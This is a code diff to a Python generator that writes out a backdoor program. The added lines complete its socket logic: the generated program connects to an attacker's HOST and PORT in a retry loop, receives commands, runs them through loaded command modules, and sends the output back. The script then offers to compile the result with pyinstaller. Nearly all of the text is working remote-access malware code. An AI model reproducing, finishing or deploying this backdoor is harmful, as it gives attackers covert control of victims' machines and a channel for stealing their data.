@@ -27,17 +27,17 @@ backdoor.write('            commands[x.command] = x.main\n')
 backdoor.write('            help[x.command] = x.description\n')
 backdoor.write('            hasarg[x.command] = x.args\n')
 backdoor.write('while 1:\n')
-#add sock.py new socket
+backdoor.write('    sock.sock.news()\n')
 backdoor.write('    connected = False\n')
 backdoor.write('    while not connected:\n')
 backdoor.write('        time.sleep(5)\n')
 backdoor.write('        try:\n')
-#add connect via sock.py
+backdoor.write('            sock.sock.s.connect((HOST,PORT))\n')
 backdoor.write('            connected = True\n')
 backdoor.write('        except:\n')
 backdoor.write('            pass\n')
 backdoor.write('    while 1:\n')
-#add data = what sock.py recv
+backdoor.write('        data = sock.sock.s.recv(1024)\n')#add data = what sock.py recv
 backdoor.write('        data = data[:len(data)-1]\n')
 backdoor.write('        if data == "quit": break\n')
 backdoor.write('        output = ""\n')
@@ -51,19 +51,19 @@ backdoor.write('        if data == "help":\n')
 backdoor.write('                output = ""\n')
 backdoor.write('                for command in help:\n')
 backdoor.write('                        output += command + " : "+help[command]\n')
-#add send output via sock.py
+backdoor.write('                sock.sock.s.send(output)\n')
 backdoor.write('        elif cmd != "" and hasarg[cmd]:\n')
 backdoor.write('                args = ""\n')
 backdoor.write('                for v in data.split(" ")[1:len(data)]:\n')
 backdoor.write('                        args = args+" " + v\n')
 backdoor.write('                        output = commands[cmd](args)\n')
-#add send output via sock.py
+backdoor.write('                sock.sock.s.send(output)\n')
 backdoor.write('        elif cmd != "" and not hasarg[cmd]:\n')
 backdoor.write('                output = commands[cmd]()\n')
-#add send output via sock.py
+backdoor.write('                sock.sock.s.send(output)\n')
 backdoor.write('        else:\n')
-#add send "ERROR" via sock.py
-#add close socket from sock.py
+backdoor.write('                sock.sock.s.send("ERROR")\n')
+backdoor.write('    sock.sock.s.close()\n')
 backdoor.close()
 if raw_input('If you have pyinstaller installed enter Y if not anything else: ') == 'Y':
     import os
